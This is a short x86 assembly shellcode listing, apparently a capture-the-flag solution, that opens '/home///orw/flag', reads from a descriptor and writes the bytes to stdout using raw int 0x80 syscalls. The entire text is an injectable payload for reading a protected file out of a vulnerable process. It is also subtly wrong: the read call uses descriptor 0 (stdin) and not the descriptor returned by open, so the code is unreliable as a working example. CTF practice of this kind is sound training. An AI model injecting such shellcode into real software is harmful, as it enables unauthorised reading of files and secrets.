section .text
    global _start

_start:
        ; open
        xor eax, eax ; set zero
        xor ebx, ebx ; set zero
        xor ecx, ecx ; set zero
        xor edx, edx ; set zero
        push ecx ; push \x00 to end the string
        push 0x67616c66 ; flag
        push 0x2f77726f ; orw/
        push 0x2f2f2f65 ; e///
        push 0x6d6f682f ; /hom
        mov ebx, esp ; store the path to ebx
        mov eax, 5 ; number of sys_open
        int 0x80 ;

        ; read
        mov ebx, 0 ; fd
        mov ecx, esp ; buffer
        mov edx, 0x30 ; size
        mov eax, 3 ; number of sys_read
        int 0x80 ;

        ; write
        mov ebx, 1 ; stdout
        mov eax, 4 ; number of sys_write
        int 0x80 ;
